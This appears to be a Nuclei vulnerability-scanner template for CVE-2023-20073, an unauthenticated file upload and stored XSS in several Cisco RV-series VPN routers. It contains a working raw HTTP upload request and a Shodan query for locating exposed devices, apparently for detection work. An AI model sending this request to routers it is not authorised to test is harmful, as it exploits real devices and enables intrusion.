id:  CVE-2023-20073
info:
  name: XSS in certain Cisco VPN routers
  author: E1A
  severity: high
  description: |
    Unauthenticated Arbitrary File Upload and Stored XSS in Cisco RV340, RV340W, RV345, RV345P VPN Routers (CVE-2023-20073)
  reference:
    - https://gist.github.com/win3zz/076742a4e365b1bba7e2ba0ebea9253f
    - https://twitter.com/HunterMapping/status/1692838826815922234
    - https://bbs.kanxue.com/thread-278240.htm
  metadata:
    max-request: 1
    shodan-query: http.title:"RV340","RV340W","RV345","RV345P"
    vendor: cisco
    product: RV340, RV340W, RV345, RV345P VPN Routers

http:
  - raw:
      - |
        POST /api/operations/ciscosb-file:form-file-upload HTTP/1.1
        Host: {{Hostname}}
        Authorization: "1"
        pathparam: Portal
        fileparam: test.sh
        file.path: test.sh
        file: CVE-2023-20073

    matchers:
      - type: word
        words:
          - "CVE-2023-20073"
        part: body
